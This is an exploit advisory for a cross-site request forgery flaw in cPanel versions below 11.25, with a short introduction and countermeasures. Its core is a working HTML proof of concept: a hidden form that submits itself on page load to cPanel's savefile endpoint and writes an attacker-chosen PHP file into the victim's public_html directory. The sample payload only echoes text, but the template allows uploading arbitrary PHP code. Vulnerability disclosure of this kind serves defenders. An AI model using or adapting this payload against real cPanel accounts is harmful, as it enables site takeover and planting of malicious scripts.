# Exploit Title: cPanel < 11.25 CSRF - Add php script
# Date: 27.05.2011
# Author: ninjashell
# Software Link: http://cpanel.net
# Version: 11.25 (see details below)
# Tested on: Linux
# CVE : N/A

I. Introduction
cPanel versions below and excluding 11.25 , are vulnerable to CSRF which
leads to uploading a PHP script of the attackers liking. If you have turned
off security tokens and referrer security check, no matter what version you
are using, you are vulnerable as well.

II. Proof of concept (PoC)
<html>
<form name="editform" action="
http://localhost:2082/frontend/x3/err/savefile.html" method=POST
onSubmit="return loadfdata();">
<input type="hidden" id="codepage" class="codepress html" name="page"
value="<?php echo 'ninjashell'; ?>">
<input type="hidden" name="domain" value="localhost">
<input type="hidden" value="public_html/" name="dir">
<input type="hidden" value="ninjashell.php" name="file">
<body onload="document.forms.editform.submit();">
</form>
</html>
Afterwards simply check for ninjashell.php in the directory.

III. Counter-measures
All cPanel versions starting from 11.25 and above have two in-built security
features to prevent such attacks - security tokens and referrer security
check. This means that if you are a cpanel client, you should update your
software.
